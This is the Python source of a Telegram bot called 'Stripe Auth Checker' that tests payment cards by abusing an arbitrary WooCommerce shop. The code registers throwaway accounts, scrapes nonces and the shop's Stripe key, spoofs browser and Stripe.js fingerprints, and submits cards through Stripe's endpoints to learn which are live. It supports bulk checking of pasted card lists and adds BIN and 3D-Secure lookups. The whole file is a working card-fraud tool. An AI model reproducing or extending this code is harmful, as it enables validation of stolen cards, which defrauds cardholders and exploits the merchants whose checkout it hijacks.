import asyncio
import html
import os
import random
import re
import time
import json
import aiohttp
import uuid
from fake_useragent import UserAgent
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters
)
import logging
import config_manager

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_IDS = [1805944073]

AWAITING_AUTH_MODE, AWAITING_CREDENTIALS = range(2)

def is_admin(user_id: int, username: str = None) -> bool:
    """Check if user is admin"""
    if user_id in ADMIN_IDS:
        return True
    if username and username.lower() == "mumiru":
        return True
    return False

def gets(s, start, end):
    """Extract string between start and end markers"""
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except (ValueError, AttributeError):
        return None

def normalize_url(url):
    """Normalize URL to ensure consistent format"""
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    url = url.rstrip('/')
    
    if '/my-account' not in url:
        url += '/my-account'
    
    return url + '/'

def parse_card_data(card_string):
    """Parse card data from string"""
    try:
        card_string = card_string.replace(' ', '')
        
        if '|' in card_string:
            parts = card_string.split('|')
            if len(parts) != 4:
                return None
            
            card_number = parts[0]
            exp_month = parts[1].zfill(2)
            exp_year = parts[2]
            cvc = parts[3]
            
            if len(exp_year) == 4:
                exp_year = exp_year[-2:]
        else:
            if len(card_string) < 19:
                return None
            
            card_number = card_string[:16]
            exp_month = card_string[16:18]
            exp_year = card_string[18:20]
            cvc = card_string[20:]
            
            if len(cvc) < 3 or len(cvc) > 4:
                return None
        
        return {
            'number': card_number,
            'exp_month': exp_month.zfill(2),
            'exp_year': exp_year,
            'cvc': cvc
        }
    except Exception:
        return None

async def get_bin_info(bin_number):
    """Get BIN information"""
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            url = f"https://bins.antipublic.cc/bins/{bin_number}"
            async with session.get(url) as response:
                if response.status == 200:
                    data = await response.json()
                    return {
                        'type': data.get('brand', 'N/A'),
                        'country': data.get('country_name', 'N/A'),
                        'bank': data.get('bank', 'N/A')
                    }
    except Exception:
        pass
    return {
        'type': 'N/A',
        'country': 'N/A',
        'bank': 'N/A'
    }

async def get_vbv_info(cc_number):
    """Get VBV (3D Secure) information from API"""
    try:
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            url = f"https://ronak.xyz/vbv.php?lista={cc_number}"
            async with session.get(url) as response:
                if response.status == 200:
                    text = await response.text()
                    return text.strip() if text else 'N/A'
    except Exception:
        pass
    return 'N/A'

def format_card_response(card_data, is_approved, response_msg, bin_info, req_by, time_taken, vbv_info='N/A'):
    """Format card check response"""
    card_display = f"{card_data['number']}|{card_data['exp_month']}|{card_data['exp_year']}|{card_data['cvc']}"
    
    if is_approved:
        status = "APPROVED ✅"
    else:
        status = "DECLINED ❌"
    
    bin_number = card_data['number'][:6]
    
    card_display_escaped = html.escape(card_display)
    bin_number_escaped = html.escape(bin_number)
    response_msg_escaped = html.escape(response_msg)
    req_by_escaped = html.escape(req_by)
    
    vbv_info_escaped = html.escape(vbv_info) if vbv_info else 'N/A'
    
    message = f"""み ¡@TOjiCHKBot ↯ ↝ 𝙍𝙚𝙨𝙪𝙡𝙩
Stripe Auth
━━━━━━━━━
𝐂𝐂 ➜ <code>{card_display_escaped}</code>
𝐒𝐓𝐀𝐓𝐔𝐒 ➜ {status}
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {response_msg_escaped}
𝑽𝑩𝑽  ➜ {vbv_info_escaped}
━━━━━━━━━
𝐁𝐈𝐍 ➜ {bin_number_escaped}
𝐓𝐘𝐏𝐄 ➜ {html.escape(bin_info.get('type', 'N/A'))}
𝐂𝐎𝐔𝐍𝐓𝐑𝐘 ➜ {html.escape(bin_info.get('country', 'N/A'))}
𝐁𝐀𝐍𝐊 ➜ {html.escape(bin_info.get('bank', 'N/A'))}
━━━━━━━━━
𝗧/𝘁 : {time_taken}s
𝐑𝐄𝐐 : {req_by_escaped}
𝐃𝐄𝐕 : @mumiru
"""
    return message

def generate_random_email():
    """Generate random email address"""
    import string
    username = ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 12)))
    number = random.randint(100, 9999)
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com']
    return f"{username}{number}@{random.choice(domains)}"

def generate_guid():
    """Generate GUID for Stripe"""
    return str(uuid.uuid4())

async def process_stripe_card(base_url, card_data, auth_mode=1, shared_email=None, shared_password=None):
    """
    Process card through Stripe with comprehensive support for all WooCommerce/Stripe configurations
    
    Supports:
    - Mode 1: Register new account
    - Mode 2: Login with credentials  
    - Mode 3: Guest mode (no authentication)
    - Multiple Stripe API endpoints (/v1/payment_methods, /v1/sources)
    - Multiple WooCommerce confirmation endpoints
    - Extensive nonce extraction patterns
    - All Stripe plugin versions
    """
    ua = UserAgent()
    
    try:
        timeout = aiohttp.ClientTimeout(total=120)
        connector = aiohttp.TCPConnector(ssl=False)
        
        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            from urllib.parse import urlparse
            parsed = urlparse(base_url)
            domain = f"{parsed.scheme}://{parsed.netloc}"
            email = generate_random_email()
            
            if auth_mode == 1:
                logger.info("Mode 1: Registering new account")
                headers = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'accept-language': 'en-US,en;q=0.9',
                    'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': ua.random,
                }
                
                response = await session.get(base_url, headers=headers)
                response_text = await response.text()
                
                register_nonce = (
                    gets(response_text, 'woocommerce-register-nonce" value="', '"') or
                    gets(response_text, 'id="woocommerce-register-nonce" value="', '"') or
                    gets(response_text, 'name="woocommerce-register-nonce" value="', '"')
                )
                
                if not register_nonce:
                    logger.warning("Register nonce not found, trying Mode 3")
                    return await process_stripe_card(base_url, card_data, auth_mode=3)
                
                username = email.split('@')[0]
                password = f"Pass{random.randint(100000, 999999)}!"
                
                register_data = {
                    'username': username,
                    'email': email,
                    'password': password,
                    'woocommerce-register-nonce': register_nonce,
                    '_wp_http_referer': '/my-account/',
                    'register': 'Register',
                }
                
                register_response = await session.post(base_url, headers=headers, data=register_data)
                register_text = await register_response.text()
                
                if 'customer-logout' not in register_text and 'dashboard' not in register_text.lower():
                    logger.info("Registration didn't auto-login, performing manual login")
                    
                    response = await session.get(base_url, headers=headers)
                    response_text = await response.text()
                    
                    login_nonce = (
                        gets(response_text, 'woocommerce-login-nonce" value="', '"') or
                        gets(response_text, 'name="woocommerce-login-nonce" value="', '"')
                    )
                    
                    if login_nonce:
                        login_data = {
                            'username': username,
                            'password': password,
                            'woocommerce-login-nonce': login_nonce,
                            '_wp_http_referer': '/my-account/',
                            'login': 'Log in',
                        }
                        
                        await session.post(base_url, headers=headers, data=login_data)
                
            elif auth_mode == 2:
                logger.info("Mode 2: Logging in with credentials")
                if not shared_email or not shared_password:
                    return False, "Mode 2 requires email and password"
                
                email = shared_email
                
                headers = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded',
                    'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': ua.random,
                }
                
                response = await session.get(base_url, headers=headers)
                response_text = await response.text()
                
                login_nonce = (
                    gets(response_text, 'woocommerce-login-nonce" value="', '"') or
                    gets(response_text, 'name="woocommerce-login-nonce" value="', '"')
                )
                
                if not login_nonce:
                    return False, "Login nonce not found"
                
                login_data = {
                    'username': shared_email,
                    'password': shared_password,
                    'woocommerce-login-nonce': login_nonce,
                    '_wp_http_referer': '/my-account/',
                    'login': 'Log in',
                }
                
                await session.post(base_url, headers=headers, data=login_data)
                
            elif auth_mode == 3:
                logger.info("Mode 3: Guest mode (no authentication)")
                payment_page_text = None
                
                try:
                    headers = {
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                        'accept-language': 'en-US,en;q=0.9',
                        'user-agent': ua.random,
                    }
                    
                    public_pages = [
                        f"{domain}/checkout/",
                        f"{domain}/cart/",
                        f"{domain}/",
                    ]
                    
                    for page_url in public_pages:
                        try:
                            response = await session.get(page_url, headers=headers)
                            page_text = await response.text()
                            
                            if 'pk_live_' in page_text or 'pk_test_' in page_text:
                                payment_page_text = page_text
                                logger.info(f"Found Stripe key on: {page_url}")
                                break
                        except Exception:
                            continue
                    
                    if not payment_page_text:
                        logger.warning("Mode 3: No Stripe key found on public pages, falling back to Mode 1")
                        return await process_stripe_card(base_url, card_data, auth_mode=1, shared_email=None, shared_password=None)
                    
                except Exception:
                    return await process_stripe_card(base_url, card_data, auth_mode=1, shared_email=None, shared_password=None)
            
            if auth_mode != 3:
                payment_methods_url = base_url.replace('/my-account/', '/my-account/payment-methods/')
                add_payment_url = base_url.replace('/my-account/', '/my-account/add-payment-method/')
                
                headers = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'accept-language': 'en-US,en;q=0.9',
                    'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': ua.random,
                }
                
                try:
                    await session.get(payment_methods_url, headers=headers)
                except Exception:
                    pass
                
                response = await session.get(add_payment_url, headers=headers)
                payment_page_text = await response.text()
            
            if auth_mode == 3:
                add_card_nonce = "not_required_mode3"
            else:
                add_card_nonce = (
                    gets(payment_page_text, 'createAndConfirmSetupIntentNonce":"', '"') or
                    gets(payment_page_text, 'add_card_nonce":"', '"') or
                    gets(payment_page_text, 'name="add_payment_method_nonce" value="', '"') or
                    gets(payment_page_text, '"add_card_nonce":"', '"') or
                    gets(payment_page_text, 'add_payment_method_nonce" value="', '"') or
                    gets(payment_page_text, 'wc_stripe_add_payment_method_nonce":"', '"') or
                    gets(payment_page_text, 'name="woocommerce-add-payment-method-nonce" value="', '"') or
                    gets(payment_page_text, 'woocommerce-add-payment-method-nonce" value="', '"') or
                    gets(payment_page_text, '_ajax_nonce":"', '"') or
                    gets(payment_page_text, 'nonce":"', '"')
                )
            
            stripe_key = (
                gets(payment_page_text, '"key":"pk_', '"') or
                gets(payment_page_text, 'data-key="pk_', '"') or
                gets(payment_page_text, "'key': 'pk_", "'") or
                gets(payment_page_text, 'stripe_key":"pk_', '"') or
                gets(payment_page_text, 'publishable_key":"pk_', '"') or
                gets(payment_page_text, 'data-stripe-key="pk_', '"') or
                gets(payment_page_text, 'key=pk_', '&') or
                gets(payment_page_text, 'key=pk_', '"') or
                gets(payment_page_text, 'key="pk_', '"') or
                gets(payment_page_text, '"key":"', '"') or
                gets(payment_page_text, 'data-key="', '"') or
                gets(payment_page_text, "'key': '", "'") or
                gets(payment_page_text, 'stripe_key":"', '"') or
                gets(payment_page_text, 'publishable_key":"', '"')
            )
            
            if not stripe_key:
                pk_pattern = r'pk_live_[a-zA-Z0-9]{24,}'
                pk_matches = re.findall(pk_pattern, payment_page_text)
                if pk_matches:
                    stripe_key = pk_matches[0]
                    logger.info(f"Found Stripe key using regex pattern: {stripe_key[:20]}...")
            
            if stripe_key and not stripe_key.startswith('pk_'):
                stripe_key = 'pk_' + stripe_key
            
            if not stripe_key or len(stripe_key) < 20:
                if auth_mode == 3:
                    logger.warning("Mode 3: Stripe key not found, falling back to Mode 1")
                    return await process_stripe_card(base_url, card_data, auth_mode=1, shared_email=None, shared_password=None)
                logger.info("Stripe key not found on site, using fallback key")
                stripe_key = 'pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv'
            
            if not add_card_nonce and auth_mode != 3:
                nonce_pattern = r'[a-f0-9]{10,}'
                nonce_matches = re.findall(nonce_pattern, payment_page_text)
                if nonce_matches:
                    add_card_nonce = nonce_matches[0]
                else:
                    return False, "Failed to get payment nonce"
            
            card_number = card_data['number']
            cvc = card_data['cvc']
            exp_month = card_data['exp_month']
            exp_year = card_data['exp_year']
            
            headers = {
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': ua.random,
            }
            
            guid = generate_guid()
            muid = generate_guid()
            sid = generate_guid()
            time_on_page = str(random.randint(50000, 150000))
            
            payment_method_id = None
            source_id = None
            
            stripe_data = {
                'type': 'card',
                'billing_details[name]': 'Card Holder',
                'billing_details[email]': email,
                'card[number]': card_number,
                'card[cvc]': cvc,
                'card[exp_month]': exp_month,
                'card[exp_year]': exp_year,
                'guid': guid,
                'muid': muid,
                'sid': sid,
                'payment_user_agent': 'stripe.js/c0b5539ba7; stripe-js-v3/c0b5539ba7; split-card-element',
                'referrer': domain,
                'time_on_page': time_on_page,
                'key': stripe_key,
            }
            
            response = await session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=stripe_data)
            
            if response.status != 200:
                error_text = await response.text()
                try:
                    error_json = json.loads(error_text)
                    if 'error' in error_json:
                        error_obj = error_json['error']
                        if isinstance(error_obj, dict):
                            error_msg = error_obj.get('message', 'Stripe API Error')
                        else:
                            error_msg = str(error_obj)
                        
                        logger.warning(f"Stripe API returned error: {error_msg}")
                except Exception:
                    logger.warning(f"Stripe API error: {error_text[:100]}")
            else:
                response_json = await response.json()
                
                if 'error' in response_json:
                    error_obj = response_json['error']
                    if isinstance(error_obj, dict):
                        error_msg = error_obj.get('message', 'Unknown error')
                    else:
                        error_msg = str(error_obj)
                    
                    logger.warning(f"Stripe returned error: {error_msg}")
                
                if 'id' in response_json:
                    payment_method_id = response_json['id']
                    logger.info(f"Created payment_method: {payment_method_id}")
            
            if not payment_method_id:
                logger.info("Trying /v1/sources endpoint as fallback")
                source_data = {
                    'type': 'card',
                    'owner[name]': 'Card Holder',
                    'owner[email]': email,
                    'card[number]': card_number,
                    'card[cvc]': cvc,
                    'card[exp_month]': exp_month,
                    'card[exp_year]': exp_year,
                    'guid': guid,
                    'muid': muid,
                    'sid': sid,
                    'pasted_fields': 'number,cvc',
                    'payment_user_agent': 'stripe.js/4d9faf87d7; stripe-js-v3/4d9faf87d7; split-card-element',
                    'referrer': domain,
                    'time_on_page': time_on_page,
                    'key': stripe_key,
                }
                
                response = await session.post('https://api.stripe.com/v1/sources', headers=headers, data=source_data)
                response_json = await response.json()
                
                if 'id' in response_json:
                    source_id = response_json['id']
                    logger.info(f"Created source: {source_id}")
                else:
                    return False, "Failed to create payment method or source"
            
            if auth_mode == 3:
                return True, "Payment method created (Mode 3: Direct Stripe)"
            
            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': domain,
                'referer': add_payment_url,
                'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': ua.random,
                'x-requested-with': 'XMLHttpRequest',
            }
            
            endpoints = []
            
            if payment_method_id:
                endpoints.extend([
                    {
                        'type': 'wc-ajax',
                        'url': f"{domain}/",
                        'params': {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'},
                        'data': {
                            'wc-stripe-payment-method': payment_method_id,
                            'wc-stripe-payment-type': 'card',
                            '_ajax_nonce': add_card_nonce
                        }
                    },
                    {
                        'type': 'ajax-action',
                        'url': f"{domain}/wp-admin/admin-ajax.php",
                        'params': None,
                        'data': {
                            'action': 'wc_stripe_create_and_confirm_setup_intent',
                            'wc-stripe-payment-method': payment_method_id,
                            'wc-stripe-payment-type': 'card',
                            '_ajax_nonce': add_card_nonce
                        }
                    },
                    {
                        'type': 'wc-ajax-action',
                        'url': f"{domain}/",
                        'params': {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'},
                        'data': {
                            'action': 'wc_stripe_create_and_confirm_setup_intent',
                            'wc-stripe-payment-method': payment_method_id,
                            'wc-stripe-payment-type': 'card',
                            '_ajax_nonce': add_card_nonce
                        }
                    },
                ])
            
            if source_id:
                endpoints.extend([
                    {
                        'type': 'wc-ajax-source',
                        'url': f"{domain}/",
                        'params': {'wc-ajax': 'wc_stripe_create_setup_intent'},
                        'data': {
                            'stripe_source_id': source_id,
                            'nonce': add_card_nonce
                        }
                    },
                ])
            
            final_response = None
            for i, endpoint_config in enumerate(endpoints):
                try:
                    logger.info(f"Trying endpoint {i+1}/{len(endpoints)}: {endpoint_config['type']}")
                    logger.info(f"URL: {endpoint_config['url']}, Data: {endpoint_config['data']}")
                    
                    if endpoint_config['params']:
                        response = await session.post(
                            endpoint_config['url'],
                            params=endpoint_config['params'],
                            headers=headers,
                            data=endpoint_config['data']
                        )
                    else:
                        response = await session.post(
                            endpoint_config['url'],
                            headers=headers,
                            data=endpoint_config['data']
                        )
                    
                    final_response = await response.text()
                    logger.info(f"Response status: {response.status}, Length: {len(final_response)}")
                    
                    if final_response and final_response.strip() and final_response != '0' and not final_response.startswith('<!DOCTYPE'):
                        logger.info(f"Got valid response from endpoint: {endpoint_config['type']}")
                        break
                    else:
                        logger.warning(f"Endpoint returned HTML or empty response, trying next...")
                        continue
                except Exception as e:
                    logger.error(f"Endpoint {endpoint_config['type']} failed: {str(e)}")
                    continue
            
            if not final_response or not final_response.strip():
                return False, "No response from payment gateway"
            
            logger.info(f"Raw Response: {final_response[:500]}")
            
            try:
                json_response = json.loads(final_response)
                
                success = json_response.get('success', False)
                
                if success is True:
                    status = json_response.get('data', {}).get('status') if isinstance(json_response.get('data'), dict) else None
                    next_action = json_response.get('data', {}).get('next_action') if isinstance(json_response.get('data'), dict) else None
                    
                    if status == 'succeeded' and not next_action:
                        return True, "Status: succeeded - Payment method authorized"
                    elif status == 'requires_action' or next_action:
                        return True, "Status: requires_action - 3DS authentication required"
                    elif status:
                        return True, f"Status: {status}"
                    else:
                        return True, json_response.get('data', {}).get('message', 'Payment method added successfully')
                
                else:
                    error_data = json_response.get('data', {})
                    if isinstance(error_data, dict):
                        error_obj = error_data.get('error', {})
                        if isinstance(error_obj, dict):
                            error_message = error_obj.get('message', 'Unknown error')
                            error_code = error_obj.get('code', '')
                            
                            if error_code:
                                exact_response = f"{error_message} (Code: {error_code})"
                            else:
                                exact_response = error_message
                            
                            return False, exact_response
                        elif isinstance(error_obj, str):
                            return False, error_obj
                        else:
                            return False, str(error_obj) if error_obj else 'Unknown error'
                    elif isinstance(error_data, str):
                        return False, error_data
                    else:
                        message = json_response.get('message', str(error_data))
                        return False, message
                        
            except json.JSONDecodeError:
                logger.error(f"Website returned non-JSON response (probably HTML error page)")
                
                if 'succeeded' in final_response.lower() and '"status"' in final_response.lower():
                    return True, "Payment succeeded (detected in HTML)"
                elif '"success":true' in final_response.lower():
                    return True, "Payment authorized (detected in HTML)"
                elif '"success":false' in final_response.lower():
                    if 'message":"' in final_response:
                        try:
                            message_start = final_response.find('message":"') + 10
                            message_end = final_response.find('"', message_start)
                            if message_end > message_start:
                                extracted_msg = final_response[message_start:message_end]
                                extracted_msg = extracted_msg.replace('\\/', '/').replace('\\"', '"')
                                return False, extracted_msg
                        except Exception:
                            pass
                    return False, "Payment declined (detected in HTML)"
                else:
                    return False, "Error: Website returned invalid response (check URL and authentication)"
                    
    except Exception as e:
        logger.error(f"Error processing card: {str(e)}")
        return False, f"Error: {str(e)[:50]}"

async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /chk command"""
    if not update.message:
        return
    
    args = context.args
    
    if not args:
        await update.message.reply_text(
            "Usage: /chk card_number|mm|yy|cvv\n"
            "Example: /chk 4242424242424242|12|25|123"
        )
        return
    
    card_string = ' '.join(args)
    card_data = parse_card_data(card_string)
    
    if not card_data:
        await update.message.reply_text("Invalid card format. Please use: card_number|mm|yy|cvv")
        return
    
    processing_msg = await update.message.reply_text("⏳ Processing card...")
    start_time = time.time()
    
    bin_info = await get_bin_info(card_data['number'][:6])
    vbv_info = await get_vbv_info(card_data['number'])
    
    config = config_manager.get_config()
    stripe_url = config.stripe_url
    auth_mode = config.auth_mode
    shared_email = config.shared_email
    shared_password = config.shared_password
    
    if not stripe_url:
        await processing_msg.edit_text(
            "⚠️ Stripe URL not configured.\n"
            "Please set it using: /setsurl <url>"
        )
        return
    
    is_approved, response_msg = await process_stripe_card(
        stripe_url, 
        card_data,
        auth_mode=auth_mode,
        shared_email=shared_email,
        shared_password=shared_password
    )
    
    time_taken = round(time.time() - start_time, 2)
    
    req_by = f"@{update.message.from_user.username}" if update.message.from_user.username else update.message.from_user.first_name
    
    formatted_response = format_card_response(
        card_data, 
        is_approved, 
        response_msg, 
        bin_info, 
        req_by, 
        time_taken,
        vbv_info
    )
    
    await processing_msg.edit_text(formatted_response, parse_mode='HTML')

async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /mchk command for mass checking"""
    if not update.message:
        return
    
    user_id = update.effective_user.id
    username = update.effective_user.username if update.effective_user else None
    is_user_admin = is_admin(user_id, username)
    
    args = context.args
    
    if not args:
        limit_msg = "Maximum 10 cards per request for users, unlimited for admins" if not is_user_admin else "Unlimited cards for admins"
        await update.message.reply_text(
            f"Usage: /mchk card1|mm|yy|cvv card2|mm|yy|cvv ...\n"
            f"Or reply to a message containing cards with /mchk\n"
            f"{limit_msg}"
        )
        return
    
    cards_to_check = []
    
    if update.message.reply_to_message and update.message.reply_to_message.text:
        card_pattern = re.compile(r'(\d{15,16})[|:](\d{1,2})[|:](\d{2,4})[|:](\d{3,4})')
        matches = card_pattern.findall(update.message.reply_to_message.text)
        max_cards = len(matches) if is_user_admin else min(len(matches), 10)
        for match in matches[:max_cards]:
            card_str = f"{match[0]}|{match[1]}|{match[2]}|{match[3]}"
            card_data = parse_card_data(card_str)
            if card_data:
                cards_to_check.append(card_data)
    else:
        max_cards = len(args) if is_user_admin else min(len(args), 10)
        for card_string in args[:max_cards]:
            card_data = parse_card_data(card_string)
            if card_data:
                cards_to_check.append(card_data)
    
    if not cards_to_check:
        await update.message.reply_text("No valid cards found. Please check the format.")
        return
    
    processing_msg = await update.message.reply_text(f"⏳ Processing {len(cards_to_check)} cards...")
    
    config = config_manager.get_config()
    stripe_url = config.stripe_url
    auth_mode = config.auth_mode
    shared_email = config.shared_email
    shared_password = config.shared_password
    
    if not stripe_url:
        await processing_msg.edit_text(
            "⚠️ Stripe URL not configured.\n"
            "Please set it using: /setsurl <url>"
        )
        return
    
    results = []
    for i, card_data in enumerate(cards_to_check, 1):
        start_time = time.time()
        
        bin_info = await get_bin_info(card_data['number'][:6])
        vbv_info = await get_vbv_info(card_data['number'])
        
        is_approved, response_msg = await process_stripe_card(
            stripe_url,
            card_data,
            auth_mode=auth_mode,
            shared_email=shared_email,
            shared_password=shared_password
        )
        
        time_taken = round(time.time() - start_time, 2)
        
        req_by = f"@{update.message.from_user.username}" if update.message.from_user.username else update.message.from_user.first_name
        
        formatted_response = format_card_response(
            card_data,
            is_approved,
            response_msg,
            bin_info,
            req_by,
            time_taken,
            vbv_info
        )
        
        results.append(formatted_response)
        
        await processing_msg.edit_text(f"⏳ Processing card {i}/{len(cards_to_check)}...")
    
    await processing_msg.delete()
    
    for result in results:
        await update.message.reply_text(result, parse_mode='HTML')
        await asyncio.sleep(0.5)

async def setsurl_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /setsurl command"""
    if update.message.from_user.id not in ADMIN_IDS:
        await update.message.reply_text("⚠️ You don't have permission to use this command.")
        return
    
    if not context.args:
        await update.message.reply_text(
            "Usage: /setsurl <stripe_url>\n"
            "Example: /setsurl https://example.com/my-account"
        )
        return
    
    url = context.args[0]
    normalized_url = normalize_url(url)
    
    await config_manager.update_url(normalized_url)
    
    await update.message.reply_text(f"✅ Stripe URL set to: {normalized_url}")

async def setauth_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /setauth command"""
    if update.message.from_user.id not in ADMIN_IDS:
        await update.message.reply_text("⚠️ You don't have permission to use this command.")
        return
    
    await update.message.reply_text(
        "Select authentication mode:\n"
        "1️⃣ Register - Create new account for each check\n"
        "2️⃣ Login - Use shared credentials\n"
        "3️⃣ Guest - No authentication required\n\n"
        "Reply with 1, 2, or 3"
    )
    
    return AWAITING_AUTH_MODE

async def receive_auth_mode(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Receive authentication mode"""
    if not update.message or not update.message.text:
        return ConversationHandler.END
    
    mode_text = update.message.text.strip()
    
    if mode_text not in ['1', '2', '3']:
        await update.message.reply_text("Invalid mode. Please reply with 1, 2, or 3")
        return AWAITING_AUTH_MODE
    
    mode = int(mode_text)
    context.user_data['pending_auth_mode'] = mode
    
    if mode == 2:
        await update.message.reply_text(
            "Please provide email and password separated by space:\n"
            "Example: user@example.com password123"
        )
        return AWAITING_CREDENTIALS
    else:
        await config_manager.update_auth_mode(mode)
        mode_names = {1: "Register", 3: "Guest"}
        await update.message.reply_text(f"✅ Authentication mode set to: {mode_names[mode]}")
        return ConversationHandler.END

async def receive_credentials(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Receive login credentials"""
    if not update.message or not update.message.text:
        return ConversationHandler.END
    
    parts = update.message.text.strip().split(maxsplit=1)
    
    if len(parts) != 2:
        await update.message.reply_text(
            "Invalid format. Please provide email and password separated by space:\n"
            "Example: user@example.com password123"
        )
        return AWAITING_CREDENTIALS
    
    email, password = parts
    mode = context.user_data.get('pending_auth_mode', 2)
    
    await config_manager.update_auth_mode(mode, email, password)
    await update.message.reply_text(f"✅ Authentication mode set to: Login\n✅ Credentials saved")
    
    return ConversationHandler.END

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel conversation"""
    await update.message.reply_text("❌ Operation cancelled")
    return ConversationHandler.END

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    await update.message.reply_text(
        "🤖 Welcome to Stripe Auth Checker!\n\n"
        "Available commands:\n"
        "/chk <card> - Check single card\n"
        "/mchk <cards> - Check multiple cards\n"
        "/setsurl <url> - Set Stripe URL (Admin)\n"
        "/setauth - Configure auth mode (Admin)\n\n"
        "Card format: 4242424242424242|12|25|123"
    )

def main():
    """Start the bot"""
    if not BOT_TOKEN:
        print("Error: BOT_TOKEN environment variable not set")
        return
    
    application = Application.builder().token(BOT_TOKEN).build()
    
    auth_handler = ConversationHandler(
        entry_points=[CommandHandler('setauth', setauth_command)],
        states={
            AWAITING_AUTH_MODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_auth_mode)],
            AWAITING_CREDENTIALS: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_credentials)],
        },
        fallbacks=[CommandHandler('cancel', cancel_command)],
    )
    
    application.add_handler(CommandHandler('start', start_command))
    application.add_handler(CommandHandler('chk', chk_command))
    application.add_handler(CommandHandler('mchk', mchk_command))
    application.add_handler(CommandHandler('setsurl', setsurl_command))
    application.add_handler(auth_handler)
    
    logger.info("Bot started!")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
